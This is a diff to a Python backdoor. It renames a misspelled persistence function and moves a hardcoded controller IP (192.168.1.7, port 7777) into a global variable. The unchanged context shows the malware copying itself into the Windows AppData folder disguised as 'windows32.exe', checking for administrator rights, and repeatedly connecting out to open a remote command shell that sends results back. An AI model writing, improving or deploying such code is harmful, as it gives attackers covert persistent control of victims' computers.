@@ -11,6 +11,9 @@ import time
 import sys
 import shutil
 
+global ipadd
+ipadd = "192.168.1.7"
+
 def admin_check():
     global admin
     try:
@@ -20,7 +23,7 @@ def admin_check():
     else:
         admin = "Privilegios de Aministrador"
 
-def create_pesistence():
+def create_persistence():
     location = os.environ['appdata'] + '\\windows32.exe'
     if not os.path.exists(location):
         shutil.copyfile(sys.executable,location)
@@ -30,8 +33,9 @@ def connection():
     while True:
         time.sleep(5)
         try:
-            cliente.connect(("192.168.1.7",7777))
+            cliente.connect((ipadd,7777))
             shell()
+
         except:
             connection()
 
@@ -106,9 +110,11 @@ def shell():
             else:
                 cliente.send(result)
 
-create_pesistence()
+
+
+create_persistence()
 cliente = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 connection()
-#cliente.connect(("192.168.1.7",7777))
+#cliente.connect((ipadd,7777))
 #shell()
 cliente.close()
